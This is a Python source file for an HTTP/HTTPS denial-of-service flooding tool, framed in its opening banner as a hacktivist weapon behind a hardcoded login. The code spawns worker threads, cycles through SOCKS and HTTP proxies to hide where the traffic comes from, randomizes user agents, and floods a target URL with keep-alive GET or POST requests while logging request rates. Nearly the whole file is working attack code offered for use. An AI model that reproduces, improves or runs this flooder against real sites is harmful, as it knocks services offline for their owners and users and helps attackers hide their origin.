from __future__ import annotations

import argparse
import itertools
import logging
import random
import signal
import socket
import ssl
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from pathlib import Path
from typing import NamedTuple
from urllib.parse import ParseResult, urlparse

import socks

attemps = 0
os.system("clear")
print("""
\033[37m
▒▒▒▒—""")
print(f"\033[97m╔{'═' * 71}╗")
print(f"\033[97m║\033[104m{' ' * 21}Don't attack government sites{' ' * 21}\033[0m║")
print(f"\033[97m║\033[104m{' ' * 20}Just to fight to help Palestine{' ' * 20}\033[0m║")
print(f"\033[97m║\033[104m{' ' * 28}_Use it wisely_{' ' * 28}\033[0m║")
print(f"\033[97m╚{'═' * 71}╝")
while attemps < 100:
    print("\033[38;5;6m┏━━KunFayz━━⬣")
    username = input("\033[38;5;6m┗> Enter Username: \033[30m")
    password = input("\033[38;5;6m┗> Enter password: \033[30m")

    if username == 'fuck zion' and password == 'free palestine':
        print("\033[100m \033[31m••> BURNING WEBS 210πiS \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] (%(threadName)s) %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

DEFAULT_USER_AGENTS_FILE = Path("default/useragents.txt")
DEFAULT_ACCEPT_HEADERS: list[str] = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/javascript, */*; q=0.01",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/xml,application/json,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
]


@dataclass(slots=True, frozen=True)
class Config:
    url: str
    workers: int
    method: str  # "GET" | "POST"
    proxy_type: str  # "direct" | "http" | "https" | "socks4" | "socks5"
    proxy_file: Path | None
    user_agents_file: Path
    connect_timeout: float
    rw_timeout: float
    reqs_per_conn: int
    stats_interval: float
    inter_request_sleep: float
    fail_sleep: float


# ---------------------------------------------------------------------------
# Proxy types
# ---------------------------------------------------------------------------


class ProxyTuple(NamedTuple):
    host: str
    port: int
    original_str: str


# ---------------------------------------------------------------------------
# Proxy manager
# ---------------------------------------------------------------------------


class ProxyManager:
    """Loads proxies from a file and hands them out in a round-robin cycle."""

    def __init__(self, proxy_type: str, proxy_file: Path | None) -> None:
        self.proxy_type = proxy_type
        self._proxies: list[ProxyTuple] = []
        self._cycle: itertools.cycle[ProxyTuple] | None = None

        if proxy_type != "direct" and proxy_file:
            self._load(proxy_file)

    # ------------------------------------------------------------------
    def _load(self, path: Path) -> None:
        try:
            lines = path.read_text().splitlines()
        except FileNotFoundError:
            logger.error("Proxy file not found: %s", path)
            sys.exit(1)

        for raw in lines:
            proxy_str = raw.strip()
            if not proxy_str or proxy_str.startswith("#"):
                continue
            if (p := self._parse(proxy_str)) is not None:
                self._proxies.append(p)

        if not self._proxies:
            logger.error("No valid proxies found in %s", path)
            sys.exit(1)

        logger.info("Loaded %d %s proxies from %s", len(self._proxies), self.proxy_type, path)
        self._cycle = itertools.cycle(self._proxies)

    @staticmethod
    def _parse(proxy_str: str) -> ProxyTuple | None:
        try:
            host, port_str = proxy_str.split(":", 1)
            port = int(port_str)
            if not host or not (1 <= port <= 65535):
                raise ValueError("invalid host or port")
            return ProxyTuple(host=host, port=port, original_str=proxy_str)
        except ValueError as exc:
            logger.warning("Skipping invalid proxy '%s': %s", proxy_str, exc)
            return None

    # ------------------------------------------------------------------
    def next(self) -> ProxyTuple | None:
        """Return the next proxy, or None for direct connections."""
        if self.proxy_type == "direct" or self._cycle is None:
            return None
        return next(self._cycle)

    @property
    def count(self) -> int:
        return len(self._proxies)


# ---------------------------------------------------------------------------
# Resource manager (user-agents + accept headers)
# ---------------------------------------------------------------------------


class ResourceManager:
    """Loads user-agent strings once; shared across all threads."""

    _instance: ResourceManager | None = None
    _lock = threading.Lock()

    def __new__(cls, user_agents_file: Path = DEFAULT_USER_AGENTS_FILE) -> ResourceManager:
        # Simple double-checked singleton so every caller gets the same loaded data.
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    inst = super().__new__(cls)
                    inst._user_agents = cls._load_user_agents(user_agents_file)
                    inst._accept_headers = DEFAULT_ACCEPT_HEADERS
                    cls._instance = inst
        return cls._instance

    @staticmethod
    def _load_user_agents(path: Path) -> list[str]:
        fallback = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ]
        try:
            agents = [ln.strip() for ln in path.read_text().splitlines() if ln.strip()]
            if not agents:
                logger.warning("No user agents in %s; using fallback.", path)
                return fallback
            logger.info("Loaded %d user agents from %s", len(agents), path)
            return agents
        except FileNotFoundError:
            logger.warning("User-agents file not found: %s; using fallback.", path)
            return fallback

    def random_ua(self) -> str:
        return random.choice(self._user_agents)  # noqa: S311

    def random_accept(self) -> str:
        return random.choice(self._accept_headers)  # noqa: S311


# ---------------------------------------------------------------------------
# Raw-socket helpers
# ---------------------------------------------------------------------------


def open_socket(
    target: ParseResult,
    proxy: ProxyTuple | None,
    proxy_type: str,
    connect_timeout: float,
    rw_timeout: float,
) -> socket.socket | None:
    """Open a (possibly SSL-wrapped) socket to *target* via *proxy*."""
    host = target.hostname or ""
    port = target.port or (443 if target.scheme == "https" else 80)
    use_ssl = target.scheme == "https"
    sock: socket.socket | None = None

    try:
        match proxy_type:
            case "direct":
                sock = socket.create_connection((host, port), timeout=connect_timeout)

            case "socks4" | "socks5":
                sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                assert proxy is not None
                sock.set_proxy(
                    socks.SOCKS4 if proxy_type == "socks4" else socks.SOCKS5,
                    proxy.host,
                    proxy.port,
                )
                sock.settimeout(connect_timeout)
                sock.connect((host, port))

            case "http" | "https":
                assert proxy is not None
                sock = socket.create_connection((proxy.host, proxy.port), timeout=connect_timeout)
                if use_ssl:
                    connect_req = (
                        f"CONNECT {host}:{port} HTTP/1.1\r\n"
                        f"Host: {host}:{port}\r\n\r\n"
                    )
                    sock.sendall(connect_req.encode())
                    sock.settimeout(rw_timeout)
                    resp = sock.recv(4096)
                    if not (resp.startswith(b"HTTP/1.1 200") or resp.startswith(b"HTTP/1.0 200")):
                        raise ConnectionRefusedError(
                            f"Proxy CONNECT failed: {resp.decode(errors='ignore').strip()}"
                        )

            case _:
                logger.error("Unsupported proxy type: %s", proxy_type)
                return None

        if use_ssl:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)

        sock.settimeout(rw_timeout)
        return sock

    except (
        socket.timeout,
        socks.ProxyConnectionError,
        socks.GeneralProxyError,
        ConnectionRefusedError,
        OSError,
    ):
        if sock:
            sock.close()
        return None
    except Exception as exc:
        logger.debug("Unexpected connect error: %s", exc)
        if sock:
            sock.close()
        return None


def send_request(
    sock: socket.socket,
    target: ParseResult,
    method: str,
    ua: str,
    accept: str,
    body: bytes | None,
) -> int:
    """Build and send a raw HTTP/1.1 request; return approximate bytes sent."""
    path = (target.path or "/") + (f"?{target.query}" if target.query else "")

    headers: dict[str, str] = {
        "Host": target.netloc,
        "User-Agent": ua,
        "Accept": accept,
        "Connection": "keep-alive",
    }
    if body:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Content-Length"] = str(len(body))

    header_block = "\r\n".join(
        [f"{method} {path} HTTP/1.1", *(f"{k}: {v}" for k, v in headers.items()), "", ""]
    )
    raw = header_block.encode() + (body or b"")
    sock.sendall(raw)
    return len(raw)


# ---------------------------------------------------------------------------
# Counters
# ---------------------------------------------------------------------------


@dataclass(slots=True)
class Stats:
    requests: int = 0
    successes: int = 0
    errors: int = 0
    conn_errors: int = 0
    bytes_sent: int = 0


# ---------------------------------------------------------------------------
# Flooder
# ---------------------------------------------------------------------------


class ThreadedFlooder:
    def __init__(self, cfg: Config, proxy_mgr: ProxyManager, res_mgr: ResourceManager) -> None:
        self.cfg = cfg
        self.proxy_mgr = proxy_mgr
        self.res_mgr = res_mgr
        self.parsed = urlparse(cfg.url)
        self._stop = threading.Event()
        self._stats = Stats()
        self._lock = threading.Lock()
        self._start_time: float = 0.0

        if self.parsed.scheme not in ("http", "https"):
            logger.error("Only http/https URLs are supported (got %s).", self.parsed.scheme)
            sys.exit(1)
        if not self.parsed.netloc:
            logger.error("URL has no host: %s", cfg.url)
            sys.exit(1)

    # ------------------------------------------------------------------
    def _record(self, *, success: bool = False, conn_err: bool = False, nbytes: int = 0) -> None:
        with self._lock:
            self._stats.requests += 1
            if success:
                self._stats.successes += 1
                self._stats.bytes_sent += nbytes
            elif conn_err:
                self._stats.conn_errors += 1
                self._stats.errors += 1
            else:
                self._stats.errors += 1

    # ------------------------------------------------------------------
    def _worker(self) -> None:
        cfg = self.cfg
        while not self._stop.is_set():
            proxy = self.proxy_mgr.next()

            # If proxies were requested but none are available yet, wait briefly.
            if cfg.proxy_type != "direct" and proxy is None:
                if self.proxy_mgr.count == 0:
                    logger.error("No proxies available. Worker exiting.")
                    break
                time.sleep(0.2)
                continue

            sock = open_socket(
                self.parsed, proxy, cfg.proxy_type, cfg.connect_timeout, cfg.rw_timeout
            )
            if sock is None:
                with self._lock:
                    self._stats.conn_errors += 1
                time.sleep(cfg.fail_sleep)
                continue

            # Reuse the connection for multiple requests (keep-alive).
            body: bytes | None = None
            if cfg.method == "POST":
                payload = "".join(random.choices(string.ascii_letters + string.digits, k=64))
                body = payload.encode()

            try:
                for _ in range(cfg.reqs_per_conn):
                    if self._stop.is_set():
                        break
                    try:
                        nbytes = send_request(
                            sock,
                            self.parsed,
                            cfg.method,
                            self.res_mgr.random_ua(),
                            self.res_mgr.random_accept(),
                            body,
                        )
                        self._record(success=True, nbytes=nbytes)
                        if cfg.inter_request_sleep > 0:
                            time.sleep(cfg.inter_request_sleep)
                    except (socket.timeout, ssl.SSLError, BrokenPipeError, OSError):
                        self._record()
                        break
                    except Exception as exc:
                        logger.debug("Send error: %s", exc)
                        self._record()
                        break
            finally:
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                sock.close()

    # ------------------------------------------------------------------
    def _stats_reporter(self) -> None:
        cfg = self.cfg
        logger.info("Stats reporter started.")
        last_count = 0
        last_time = self._start_time

        while not self._stop.wait(timeout=cfg.stats_interval):
            now = time.monotonic()
            elapsed_total = now - self._start_time
            elapsed_interval = now - last_time

            with self._lock:
                s = Stats(
                    self._stats.requests,
                    self._stats.successes,
                    self._stats.errors,
                    self._stats.conn_errors,
                    self._stats.bytes_sent,
                )

            interval_reqs = s.requests - last_count
            rps_now = interval_reqs / elapsed_interval if elapsed_interval > 0 else 0.0
            rps_avg = s.requests / elapsed_total if elapsed_total > 0 else 0.0
            ok_pct = s.successes / s.requests * 100 if s.requests else 0.0
            err_pct = s.errors / s.requests * 100 if s.requests else 0.0
            mb = s.bytes_sent / 1024 / 1024
            mbps = mb * 8 / elapsed_total if elapsed_total > 0 else 0.0

            logger.info(
                "Stats: t=%.1fs | req=%d | ok=%d (%.1f%%) | err=%d (%.1f%%) [conn=%d] "
                "| rps=%.1f (avg %.1f) | sent=%.2f MB (%.2f Mbps)",
                elapsed_total, s.requests, s.successes, ok_pct,
                s.errors, err_pct, s.conn_errors,
                rps_now, rps_avg, mb, mbps,
            )
            last_count = s.requests
            last_time = now

    # ------------------------------------------------------------------
    def _on_signal(self, signum: int, _frame: object) -> None:
        if not self._stop.is_set():
            logger.warning("Signal %s received – stopping…", signal.Signals(signum).name)
            self._stop.set()

    # ------------------------------------------------------------------
    def run(self) -> None:
        cfg = self.cfg

        if cfg.proxy_type != "direct" and self.proxy_mgr.count == 0:
            logger.error("No proxies loaded; cannot start.")
            return

        logger.info("Target : %s", cfg.url)
        logger.info("Method : %s | Proxy: %s | Workers: %d", cfg.method, cfg.proxy_type, cfg.workers)
        logger.info("Req/conn: %d | connect_timeout: %ss | rw_timeout: %ss",
                    cfg.reqs_per_conn, cfg.connect_timeout, cfg.rw_timeout)

        self._start_time = time.monotonic()

        signal.signal(signal.SIGINT, self._on_signal)
        signal.signal(signal.SIGTERM, self._on_signal)

        stats_thread = threading.Thread(target=self._stats_reporter, name="StatsReporter", daemon=True)
        stats_thread.start()

        with ThreadPoolExecutor(max_workers=cfg.workers, thread_name_prefix="Worker") as pool:
            futures = [pool.submit(self._worker) for _ in range(cfg.workers)]
            try:
                # Block until signalled.
                self._stop.wait()
            except KeyboardInterrupt:
                self._stop.set()
            # Executor __exit__ calls shutdown(wait=True) – workers check _stop on each iteration.

        stats_thread.join(timeout=cfg.stats_interval + 1)
        self._print_final_stats()

    # ------------------------------------------------------------------
    def _print_final_stats(self) -> None:
        runtime = time.monotonic() - self._start_time
        with self._lock:
            s = self._stats
        rps = s.requests / runtime if runtime > 0 else 0.0
        ok_pct = s.successes / s.requests * 100 if s.requests else 0.0
        err_pct = s.errors / s.requests * 100 if s.requests else 0.0
        mb = s.bytes_sent / 1024 / 1024
        mbps = mb * 8 / runtime if runtime > 0 else 0.0

        sep = "=" * 58
        print(f"\n{sep}")
        print(f" Final Statistics")
        print(sep)
        print(f"  Target:            {self.cfg.url}")
        print(f"  Runtime:           {runtime:.2f}s")
        print(f"  Total requests:    {s.requests}")
        print(f"  Successful:        {s.successes} ({ok_pct:.1f}%)")
        print(f"  Failed:            {s.errors} ({err_pct:.1f}%)")
        print(f"  Connection errors: {s.conn_errors}")
        print(f"  Avg RPS:           {rps:.2f}")
        print(f"  Data sent:         {mb:.2f} MB ({mbps:.2f} Mbps)")
        print(sep)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def build_config(args: argparse.Namespace) -> Config:
    return Config(
        url=args.url,
        workers=args.workers,
        method=args.method.upper(),
        proxy_type=args.proxy_type,
        proxy_file=Path(args.proxy_file) if args.proxy_file else None,
        user_agents_file=Path(args.user_agents),
        connect_timeout=args.connect_timeout,
        rw_timeout=args.rw_timeout,
        reqs_per_conn=args.reqs_per_conn,
        stats_interval=args.stats_interval,
        inter_request_sleep=args.inter_request_sleep,
        fail_sleep=args.fail_sleep,
    )


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="rboz – threaded raw-socket HTTP/S stresser",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("url", help="Target URL (e.g. https://example.com/path)")
    p.add_argument("workers", type=int, help="Number of concurrent worker threads")
    p.add_argument("method", choices=["get", "post"], help="HTTP method")
    p.add_argument(
        "--proxy-type",
        default="direct",
        choices=["direct", "http", "https", "socks4", "socks5"],
        help="Proxy protocol",
    )
    p.add_argument(
        "--proxy-file",
        default=None,
        metavar="FILE",
        help="File with proxies (host:port, one per line). Required when --proxy-type != direct.",
    )
    p.add_argument(
        "--user-agents",
        default=str(DEFAULT_USER_AGENTS_FILE),
        metavar="FILE",
        help="File of User-Agent strings (one per line)",
    )
    p.add_argument("--connect-timeout", type=float, default=10.0, metavar="SEC")
    p.add_argument("--rw-timeout", type=float, default=15.0, metavar="SEC")
    p.add_argument("--reqs-per-conn", type=int, default=100, metavar="N",
                   help="Requests per keep-alive connection before recycling")
    p.add_argument("--stats-interval", type=float, default=5.0, metavar="SEC")
    p.add_argument("--inter-request-sleep", type=float, default=0.0, metavar="SEC",
                   help="Sleep between requests on the same connection (0 = yield only)")
    p.add_argument("--fail-sleep", type=float, default=0.5, metavar="SEC",
                   help="Sleep after a connection failure")

    args = p.parse_args(argv)

    if args.proxy_type != "direct" and not args.proxy_file:
        p.error("--proxy-file is required when --proxy-type is not 'direct'")
    if args.proxy_type == "direct" and args.proxy_file:
        logger.warning("--proxy-file ignored because --proxy-type is 'direct'.")
        args.proxy_file = None

    return args

def main(argv: list[str] | None = None) -> None:
    args = parse_args(argv)
    cfg = build_config(args)

    res_mgr = ResourceManager(cfg.user_agents_file)
    proxy_mgr = ProxyManager(cfg.proxy_type, cfg.proxy_file)
    flooder = ThreadedFlooder(cfg, proxy_mgr, res_mgr)
    flooder.run()


if __name__ == "__main__":
    main()
